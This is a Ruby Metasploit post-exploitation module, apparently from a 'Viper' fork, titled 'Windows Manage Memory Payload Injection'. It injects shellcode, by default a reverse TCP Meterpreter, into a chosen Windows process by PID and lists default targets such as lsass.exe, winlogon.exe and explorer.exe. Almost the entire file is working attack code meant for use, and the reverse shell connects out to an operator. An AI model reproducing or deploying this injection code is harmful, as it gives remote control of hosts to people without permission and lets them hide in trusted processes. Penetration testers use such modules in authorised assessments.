##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/exploit/exe'


class MetasploitModule < Msf::Exploit::Local
  Rank                  = ExcellentRanking
  DEFAULT_ADMIN_TARGETS = ['services.exe', 'svchost.exe', 'lsass.exe', 'lsm.exe', 'winlogon.exe', 'wininit.exe', 'svchost.exe',]
  DEFAULT_USER_TARGETS  = ['explorer.exe']
  include Msf::Post::Windows::Process


  def initialize(info = {})
    super(update_info(info,
                      'Name'           => 'Windows Manage Memory Payload Injection',
                      'Description'    => %q{
          This module will inject a payload into memory of a process.  If a payload
        isn't selected, then it'll default to a reverse x86 TCP meterpreter.  If the PID
        datastore option isn't specified, then it'll inject into notepad.exe instead.
      },
                      'License'        => MSF_LICENSE,
                      'Author'         =>
                              [
                                      'viper',
                              ],
                      'Platform'       => ['win'],
                      'Arch'           => [ARCH_X86, ARCH_X64],
                      'SessionTypes'   => ['meterpreter'],
                      'Targets'        => [['Windows', {}]],
                      'DefaultTarget'  => 0,
                      'DisclosureDate' => "20190323"
          ))

    register_options(
            [
                    OptInt.new('PID', [true, 'Process Identifier to inject of process to inject payload.']),
                    OptEnum.new('ACTION', [true, 'Payload trigger method', 'inject', ['inject']]),
            ])
  end

  # Run Method for when run command is issued
  def exploit

    if session.type == "shell"
      pub_json_result(false,
                      'Unsupport shell type',
                      nil,
                      self.uuid)
      return
    end

    unless session.platform == "windows"

      pub_json_result(false,
                      'do not support linux',
                      nil,
                      self.uuid)
      return
    end
    target_pid = datastore['PID']
    if datastore['ACTION'] === 'inject'
      flag, msg = inject_payload_to_pid(target_pid)

      if flag
        pub_json_result(true,
                        nil,
                        {:pid => target_pid},
                        self.uuid)
        return
      else
        pub_json_result(false,
                        "fail to inject shellcode into target_pid",
                        {:pid => target_pid},
                        self.uuid)
        return
      end
    else
      pub_json_result(false,
                      "unknow action",
                      nil,
                      self.uuid)
      return
    end
  end


  def inject_payload_to_pid(pid)
    begin
      vprint_status("Preparing '#{@payload_name}' for PID #{pid}")
      raw    = payload.encoded
      thread = execute_shellcode(raw, nil, pid)
      unless thread
        return false, 'create new thread failed'
      end
      return true, ''
    rescue Rex::Post::Meterpreter::RequestError => e
      return false, e
    end
  end
end
